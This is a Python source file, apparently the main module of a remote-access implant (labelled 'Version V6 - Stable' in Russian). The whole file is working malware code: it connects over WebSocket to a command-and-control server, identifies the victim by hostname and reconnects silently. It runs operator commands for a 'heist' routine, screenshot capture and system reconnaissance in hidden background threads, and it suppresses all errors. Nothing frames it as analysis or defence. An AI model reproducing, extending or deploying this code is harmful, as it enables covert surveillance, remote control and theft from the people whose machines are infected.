#
# --- ФАЙЛ: main.py (Версия V6 - Стабильная) ---
#
try: import asyncio, json, multiprocessing, socket, sys, threading, aiohttp
except: sys.exit(1)

import runtime_fix, settings
from heist import start_heist
from recon import run_screenshot_recon, run_sysinfo_recon

async def send_pings(websocket):
    while not websocket.closed:
        try: await websocket.send_str('ping'); await asyncio.sleep(30)
        except: break

async def run_implant():
    client_id = f"implant_{socket.gethostname()}"; uri = f"wss://{settings.C2_HOST}/ws"
    while True:
        ping_task = None
        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(uri) as websocket:
                    loop = asyncio.get_running_loop()
                    ping_task = asyncio.create_task(send_pings(websocket))
                    initial_data = {"type": "implant", "id": client_id}
                    await websocket.send_json(initial_data)

                    async for msg in websocket:
                        if msg.type == aiohttp.WSMsgType.TEXT and msg.data != 'pong':
                            command = json.loads(msg.data); action = command.get('action')
                            target_map = {
                                'heist': (start_heist, []), 'screenshot': (run_screenshot_recon, []),
                                'sysinfo': (run_sysinfo_recon, [])
                            }
                            if action in target_map:
                                func, args = target_map[action]
                                args.extend([websocket, loop])
                                threading.Thread(target=func, args=tuple(args), daemon=True).start()
        except: pass
        finally:
            if ping_task: ping_task.cancel()
            await asyncio.sleep(15)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    asyncio.run(run_implant())